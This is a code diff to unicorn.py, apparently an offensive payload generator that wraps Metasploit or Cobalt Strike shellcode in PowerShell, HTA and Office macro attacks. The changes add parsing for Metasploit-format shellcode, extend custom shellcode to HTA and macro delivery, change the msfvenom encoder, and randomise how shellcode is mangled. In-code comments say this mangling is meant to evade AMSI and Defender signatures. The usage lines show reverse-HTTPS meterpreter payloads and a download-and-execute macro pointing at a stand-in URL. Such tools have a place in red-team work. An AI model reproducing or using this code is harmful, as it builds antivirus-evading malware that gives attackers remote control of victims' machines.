@@ -15,6 +15,11 @@
 # Requirements: Need to have Metasploit installed if using Metasploit methods.
 # Also supports Cobalt Strike and custom shellcode delivery methods.
 #
+#
+# IMPORTANT: The way this works is by using 32-bit shellcode and a 32-bit downgrade attack.
+# That means your payloads should be a 32-bit payload, not a 64-bit. It will not work if you
+# generate a 64-bit platform. Don't fret - the 32-bit payload works on the 64-bit platform.
+#
 # Special thanks to Matthew Graeber and Josh Kelley
 #
 import base64
@@ -168,10 +173,6 @@ go to run this, you will need to do it directly through powershell.exe and not c
 
     """)
 
-
-
-
-
 # display macro help
 def macro_help():
     print("""
@@ -222,7 +223,6 @@ properly.
 
 	""")
 
-
 # display powershell help
 def ps_help():
     print("""
@@ -236,7 +236,6 @@ Note that you will need to have a listener enabled in order to capture the attac
 
 [*******************************************************************************************************]
 	""")
-
 
 # display cert help
 def cert_help():
@@ -505,7 +504,6 @@ def gen_usage():
     print("PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro")
     print("Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro")
     print("Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro")
-    print("Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro")
     print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
     print("HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms")
     print("HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta")
@@ -517,7 +515,9 @@ def gen_usage():
     print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
     print("Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)")
-    print("Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)")
+    print("Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)")
+    print("Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)")
+    print("Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)")
     print("Generate .SettingContent-ms: python unicorn.py ms")
     print("Help Menu: python unicorn.py --help\n")
 
@@ -712,6 +712,21 @@ def gen_hta_attack(command):
     write_file("hta_attack/Launcher.hta", main1 + main2 + main4)
 
 
+# format metasploit shellcode
+def format_metasploit(data):
+    # start to format this a bit to get it ready
+    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
+    data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
+    if len(data) < 1:
+        #print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
+        print("[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.")
+        print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
+        print("Exiting....")
+        sys.exit()
+
+    return data
+
+
 # generate the actual shellcode through msf
 def generate_shellcode(payload, ipaddr, port):
     print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
@@ -763,21 +778,12 @@ def generate_shellcode(payload, ipaddr, port):
         # gen random number for length
         uri_length=generate_random_number(3,6)
 
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength={3} StagerVerifySSLCert=true -a x86 --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
-        data = data.decode("ascii").replace('"\\xfc', '"', 1)
+        #data = data.decode("ascii").replace('"\\xfc', '"', 1)
 
-    # start to format this a bit to get it ready
-    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
-    data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
-
-    if len(data) < 1:
-        print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
-        print("Exiting....")
-        sys.exit()
-
-    return data
+    return format_metasploit(data)
 
 # generate shellcode attack and replace hex
 def gen_shellcode_attack(payload, ipaddr, port):
@@ -882,8 +888,9 @@ def gen_shellcode_attack(payload, ipaddr, port):
     msv = mangle_word("msvcrt.dll")
 
     # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
-
-    mangle_shellcode = generate_random_string(2, 2)
+    random_symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
+    mangle_shellcode = (random.choice(random_symbols))
+    #mangle_shellcode = generate_random_string(1, 1).upper()
     shellcode = shellcode.replace("0x", mangle_shellcode)
 
     # one line shellcode injection with native x86 shellcode
@@ -1003,9 +1010,18 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             macro_help()
 
         else:
-            write_file("powershell_attack.txt", full_attack)
-            custom_shellcode()
-            print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")
+            # add HTA option for shellcode
+            if "hta" in sys.argv:
+                gen_hta_attack(full_attack)
+                print("[*] Exported the custom shellcode to the hta generation under the hta_attacks folder. Enjoy!|n")
+            if "macro" in sys.argv:
+                macro_gen = generate_macro(full_attack)
+                write_file("powershell_attack.txt", macro_gen)
+                print("[*] Exported the custom shellcode to the macro generation and exported to powershell_attack.txt. Enjoy!\n")
+            else:
+                write_file("powershell_attack.txt", full_attack)
+                custom_shellcode()
+                print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")
 
     if attack_type == "msf" or attack_type == "download/exec":
         if attack_modifier == "macro":
@@ -1186,9 +1202,9 @@ try:
         payload = open(sys.argv[1], "r").read()
 
         if not "," in payload:
-            print("[!] Critical: It does not appear that your payload is formatted properly. Shellcode should be in a 0x00,0x01 format.")
-            print("[!] Fix the formatting to ensure shellcode is formatted properly and try again.")
-            sys.exit()
+
+            # attempt to see if its metasploit
+            payload = format_metasploit(payload)
 
         if attack_type == "cs":
             #if not "char buf[] =" in payload:
